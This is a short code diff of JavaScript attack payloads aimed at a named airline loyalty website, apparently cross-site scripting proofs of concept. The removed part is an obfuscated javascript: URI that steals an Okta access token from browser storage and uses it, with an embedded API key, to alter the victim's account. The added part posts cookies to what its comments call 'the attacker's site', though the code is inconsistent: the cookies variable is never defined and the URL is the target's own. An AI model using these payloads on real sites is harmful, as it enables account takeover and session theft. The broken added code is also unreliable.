@@ -1,18 +1,18 @@
-j%0D%0Aava%0D%0Ascript%0D%0A:
-var test2 = localStorage.getItem('okta-token-storage');
-var data2 = JSON.parse(test2);
-this.token = data2.accessToken.accessToken;
-fetch('https://trueblue.jetblue.com', {
-    method: "PATCH",
-    mode: "cors",
-    cache: "no-cache",
-    credentials: "same-origin",
-    headers: {
-        "Content-Type": "application/json",
-        "Authorization": "Bearer " + this.token,
-        "Apikey": "1130bcb5c61d494dad508c91f1e88f60"
-    },
-    redirect: "follow",
-    referrerPolicy: "no-referrer",
-    body: JSON.stringify({"DisplayName": "eeeeruu"})
+// Send the cookies to the attacker's site
+fetch('https://trueblue.jetblue.com/my-dashboard?skipCustomerRefresh=true', {
+    method: 'POST',
+    body: JSON.stringify({cookies: cookies}),
+    headers: {'Content-Type': 'application/json'}
+})
+.then(response => {
+    // Optionally, you can handle the response from the attacker’s site
+    return response.text();
+})
+.then(data => {
+    // Alert the cookies after the fetch is complete
+    alert('Cookies sent: ' + cookies);
+})
+.catch(error => {
+    console.error('Error:', error);
+    alert('Failed to send cookies');
 });
